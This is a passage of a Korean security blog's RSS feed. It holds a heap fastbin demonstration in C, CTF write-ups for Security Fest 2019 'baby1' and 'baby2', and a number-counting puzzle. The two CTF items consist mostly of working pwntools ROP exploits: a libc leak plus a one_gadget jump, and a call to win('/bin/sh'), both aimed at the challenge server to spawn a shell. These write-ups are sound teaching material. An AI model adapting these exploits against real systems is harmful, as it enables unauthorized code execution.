class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">char</span> *d = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) A : %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) B : %p\n"</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) C : %p\n"</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) D : %p\n"</span>, d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc A-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc B-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc C-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc D-------"</span>);</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------malloc(100) A-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------malloc(100) B-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------malloc(100) C-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------malloc(100) D-------"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) A : %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) B : %p\n"</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) C : %p\n"</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) D : %p\n"</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center> <caption> [Example2.c] </caption> </center>다음은 fastbin 예제이다. fastbin은 단일 연결 리스트<sup id="fnref:3"><a href="#fn:3" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="Singly Linked list">[3]</span></a></sup>라서 메모리 할당 및 해제 속도가 빠르며 LIFO 구조를 지니고 있다.아래의 과정을 확인해보면 알 수 있다.<p><code>head - a - tail</code> <strong>free⒜</strong><br><code>head - b - a - tail</code><strong>free⒝</strong><br><code>head - c - b - a - tail</code> <strong>free⒞</strong><br><code>head - d - c - b - a - tail</code> <strong>free⒟</strong><br><code>head - c - b - a - tail</code> <strong>malloc⒜</strong><br><code>head - b - a - tail</code> <strong>malloc⒝</strong><br><code>head - a - tail</code> <strong>malloc⒞</strong><br><code>head - tail</code> <strong>malloc⒟</strong></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58298844-fd44c180-7e17-11e9-97cc-e8d39f0a619d.PNG"><center> [실행 결과] </center> <br><center> <h5 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> <a href="https://heap-exploitation.dhavalkapil.com/attacks/first_fit.html" target="_blank" rel="noopener">Reference</a></h5></center><style>  img.border-shadow{          border:1px solid #888888;          box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);      }</style><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">동적할당<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">할당해제<a href="#fnref:2" rev="footnote"> ↩</a></span></li><li id="fn:3"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">3.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">Singly Linked list<a href="#fnref:3" rev="footnote"> ↩</a></span></li></ol></div></div>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Security Fest 2019 baby2</title>
      <link>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/</link>
      <guid>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/</guid>
      <pubDate>Fri, 24 May 2019 00:03:43 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;baby2&quot;&gt;&lt;a class=&quot;markdownIt-Ancho
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="baby2"><a class="markdownIt-Anchor" href="#baby2"></a> Baby2</h3><p><code>기본 ROP 문제</code></p><p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3342581/baby2.zip" target="_blank" rel="noopener"><strong>바이너리</strong></a></p><p>우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. <sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="내부 인스트럭션에서 조금 차이가 있는 듯하다. [참고](https://kong.re.kr/?p=335)">[1]</span></a></sup> <small> (일단 난 잘됨) </small></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process('./baby2')</span></span><br><span class="line">r = remote(<span class="string">'baby-01.pwn.beer'</span>, <span class="number">10002</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">main = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">pr = <span class="number">0x0000000000400783</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(puts_got)</span><br><span class="line">p += p64(puts_plt)</span><br><span class="line">p += p64(main) </span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"input: "</span>)</span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leaked)</span><br><span class="line">libc_base = leaked - puts_offset</span><br><span class="line">one_shot = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(one_shot)</span><br><span class="line">sla(<span class="string">'input: '</span>, p)</span><br><span class="line">ex()</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58294548-a46c2d80-7e05-11e9-8941-275e6762359b.PNG"><center><small>[Remote]</small></center> <br><style>  img.border-shadow{        border:1px solid #888888;        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);    }</style><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">내부 인스트럭션에서 조금 차이가 있는 듯하다. <a href="https://kong.re.kr/?p=335" target="_blank" rel="noopener">참고</a><a href="#fnref:1" rev="footnote"> ↩</a></span></li></ol></div></div>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Security Fest 2019 baby1</title>
      <link>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby1/</link>
      <guid>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby1/</guid>
      <pubDate>Fri, 24 May 2019 00:01:52 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;baby2&quot;&gt;&lt;a class=&quot;markdownIt-Ancho
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="baby2"><a class="markdownIt-Anchor" href="#baby2"></a> Baby2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process('./baby1')</span></span><br><span class="line">r = remote(<span class="string">'baby-01.pwn.beer'</span>, <span class="number">10001</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby1'</span>)</span><br><span class="line">binsh = e.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">pr = <span class="number">0x0000000000400793</span> <span class="comment"># pop rdi; ret </span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">p = <span class="string">"A"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(binsh)</span><br><span class="line">p += p64(e.symbols[<span class="string">'win'</span>])</span><br><span class="line">sl(p)</span><br><span class="line">ru(<span class="string">"input: "</span>)</span><br><span class="line">ex();</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center> <br>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>ALLMN CTF 2019 Doesn&#39;t contain K integer</title>
      <link>http://j0n9hyun.github.io/2019/05/05/doesnt_contain_k_integer/</link>
      <guid>http://j0n9hyun.github.io/2019/05/05/doesnt_contain_k_integer/</guid>
      <pubDate>Sat, 04 May 2019 17:06:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;doesnt-contain-k-integer&quot;&gt;&lt;a clas
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="doesnt-contain-k-integer"><a class="markdownIt-Anchor" href="#doesnt-contain-k-integer"></a> Doesn’t contain K integer</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">How many numbers from 1 to N that don&apos;t contain K number. Input: N (integer number) and space K (integer number).  </span><br><span class="line">Output: The total number. Example if N is 30 and K is 3 there are 27 numbers that don&apos;t contain number 3.  </span><br><span class="line">So the flag will be ALLMN&#123;total number&#125;</span><br></pre></td></tr></table></figure><center><small>[문제 내용]</small></center><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">281939942</span></span><br><span class="line">k = <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'3'</span> <span class="keyword">in</span> str(i):</span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"total is "</span> + str(n)</span><br></pre></td></tr></table></figure><center><small>[Python]</small></center><p>파이썬으로 짜면 금방인 문제. 하지만 간단하면서도 간단하지 않다. 계산하는 수가 매우 높아서 소요 시간이 개노답이기 때문이다. 그래서 결국 c로 다시 뚝딱했다.<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="C와 Python의 연산 속도는 약 100배가량  차이가  난다.">[1]</span></a></sup> c로도 약 2시간 30분이 소요 됐다. (더 빠른 알고리즘이 있겠지만 아몰랑) <br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num_start = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> num_end = <span class="number">281939942</span>;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> digit = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">digit %= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (num = num_start; num &lt;= num_end; num++) &#123;</span><br><span class="line"><span class="keyword">int</span> temp_num = num;</span><br><span class="line"><span class="keyword">int</span> have = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (digit == <span class="number">0</span>) &#123;</span><br><span class="line">have = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (temp_num &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp_num % <span class="number">10</span> == digit) &#123;</span><br><span class="line">have = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp_num /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (have == <span class="number">1</span>) &#123;</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, num);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\ncount : %d\n"</span>, num_end-count+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[C]</small></center><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58037160-c3e62a80-7b67-11e9-9c1e-41ef1aac964a.png"><center><small>[Run]</small></center><style>  img.border-shadow{    border:1px solid #888888;    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);}</style><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">C와 Python의 연산 속도는 약 100배가량  차이가  난다.<a href="#fnref:1" rev="footnote"> ↩</a></span></li></ol></div></div>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/05/doesnt_contain_k_integer/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
